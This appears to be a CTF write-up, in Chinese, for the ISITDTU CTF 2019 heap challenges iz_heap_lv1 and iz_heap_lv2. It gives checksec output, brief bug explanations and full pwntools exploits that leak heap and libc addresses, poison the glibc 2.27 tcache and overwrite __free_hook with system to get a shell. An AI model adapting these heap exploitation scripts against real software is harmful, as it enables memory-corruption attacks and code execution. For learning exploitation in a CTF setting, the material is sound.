## Pwn

### iz_heap_lv1

```
// file
iz_heap_lv1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=03331a270efbb8a9456c60ae90f44cb384028f76, stripped

// checksec
[*] '/home/u1f383/tmp/pwn/ISITDTU-CTF-2019/Quals/Pwn/iz_heap_lv1/iz_heap_lv1/iz_heap_lv1'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

glibc 2.27。



由於 array 的 index check 沒有寫好，導致 list 中有一個 pointer 是可以控制，因此透過控制 pointer + no PIE，可以 `free` 任意大小的 chunk，並且如果 chunk 是在可控範圍，也能修改 freed chunk (UAF)，搭配 glibc 2.27 tcache 檢查機制薄弱，最後寫 `__free_hook` 即可 exploit:

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = process("./I", env={"LD_PRELOAD": "./libc.so.6"})
gdb.attach(r, """
b *0x400b01
c
""")


"""
1. Add
2. Edit
3. Delete
4. Show
5. Exit
"""

def add(sz, ct):
    r.sendlineafter('Choice: ', '1')
    r.sendlineafter('Enter size: ', str(sz))
    r.sendafter('Enter data: ', ct)

def edit(idx, sz, ct):
    r.sendlineafter('Choice: ', '2')
    r.sendlineafter('Enter index: ', str(idx))
    r.sendlineafter('Enter size: ', str(sz))
    r.sendafter('Enter data: ', str(ct))

def delete(idx):
    r.sendlineafter('Choice: ', '3')
    r.sendlineafter('Enter index: ', str(idx))

def show(name=''):
    edit = True if name != '' else False

    r.sendlineafter('Choice: ', '4')
    r.sendafter('DO you want to edit: (Y/N)', 'Y' if edit else 'N')
    if edit:
        r.sendafter('Input name: ', name)

l = 0x602060
name = 0x602100
stderr = 0x602040
info(f"""
list: {hex(l)}
name: {hex(name)}
""")

## leak heap ##
pl = p64(0x602110) + p64(0x21) + p64(0x602020)
r.sendafter('Input name: ', pl)
add(0x20, str(0))
edit(20, 0x20, 'meow')
show()
r.recvuntil('Name: ')
heap = u64(r.recvline()[:-1].ljust(8, b'\x00'))
info(f"""
heap: {hex(heap)}
""")

## leak libc ##
pl = p64(0) + p64(0x21) + p64(stderr) # modify tcache fd
show(pl)
add(0x10, 'A')
add(0x10, 'B')
show(p64(0))
edit(20, 0x10, 'C')
show()
r.recvuntil('Name: ')
libc = u64(r.recvline()[:-1].ljust(8, b'\x00')) - 0x3ec680
__free_hook = libc + 0x3ed8e8
_system = libc + 0x4f440
info(f"""
libc: {hex(libc)}
""")

## exploit ##
pl = p64(0x602110) + p64(0x41) + p64(0)
show(pl)
edit(20, 0x40, 'D')
pl = p64(0) + p64(0x41) + p64(__free_hook)
show(pl)
add(0x30, 'E')
add(0x30, p64(_system))
show(p64(name + 8) + b"/bin/sh\x00")
delete(20)

r.interactive()
```

- 如果在 `malloc()` 之前就已經 `free()`，則不會有 tcache struct



### iz_heap_lv2

```
// file
iz_heap_lv2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=b02ab240b561964f41c82d1ff84f51fc5f9c859e, stripped

// checksec
[*] '/home/u1f383/tmp/pwn/ISITDTU-CTF-2019/Quals/Pwn/iz_heap_lv2/iz_heap_lv2/iz_heap_lv2'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

glibc 2.27。



1. 用 tcache 殘留下的 fd 來 leak heap address
2. 用 unsorted bin consolidation 過後留下的 pointer 取得 libc address
3. 用 off-by-one + unlink 與 tcache chunk overlap
4. glibc 2.27 直接改 tcache fd 為 `__free_hook` 即可

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = process("./I", env={"LD_PRELOAD": "./libc.so.6"})
gdb.attach(r, """
""")

"""
1. Add
2. Edit
3. Delete
4. Show
5. Exit
"""

def add(sz, ct):
    r.sendlineafter('Choice: ', '1')
    r.sendlineafter('Enter size: ', str(sz))
    r.sendafter('Enter data: ', ct)

def edit(idx, ct):
    r.sendlineafter('Choice: ', '2')
    r.sendafter('Enter data: ', str(ct))

def delete(idx):
    r.sendlineafter('Choice: ', '3')
    r.sendlineafter('Enter index: ', str(idx))

def show(idx):
    r.sendlineafter('Choice: ', '4')
    r.sendlineafter('Enter index: ', str(idx))

l = 0x602040
chk_sz = 0x6020E0
info(f"""
list: {hex(l)}
chk_sz: {hex(chk_sz)}
""")

### leak heap ###
add(0xf7, 'leak heap')
add(0xf7, 'leak heap')
delete(0)
delete(1)
add(0xf7, 'A')
show(0)
r.recvuntil('Data: ', )
heap = u64(r.recvline()[:-1].ljust(8, b'\x00')) - 0x241
info(f"""
heap: {hex(heap)}
""")
delete(0)

### leak libc ###
for i in range(0x7): # 0 ~ 6
    add(0xf7, 'fill tcache')

add(0xf7, 'chunk for consolidation') # 7
add(0xf7, 'chunk for consolidation') # 8
add(0xf7, 'victim') # 9
add(0x17, 'meow') # 10, prevent consolidation

for i in range(0x7):
    delete(i)

delete(8)
delete(7)
add(0x37, 'A') # 0
show(0)
r.recvuntil('Data: ', )
libc = u64(r.recvline()[:-1].ljust(8, b'\x00')) - 0x3ebe41
__free_hook = libc + 0x3ed8e8
_system = libc + 0x4f440
info(f"""
libc: {hex(libc)}
""")

### exploit ###
add(0xe7, '/bin/sh') # 1 --> for free("/bin/sh")
add(0x37, p64(0) * 3 + p64(0xb0) + p64(heap + 0xaa0) * 2) # 2
add(0x37, 'victim 2') # 3
add(0x48, p64(0)*8 + p64(0xb0)) # 4
delete(2)
delete(3)
delete(9) # overlap with victim 2
add(0x57, p64(0)*3 + p64(0x41) + p64(__free_hook))
add(0x37, 'meow')
add(0x37, p64(_system)) # write __free_hook
delete(1)

r.interactive()
```



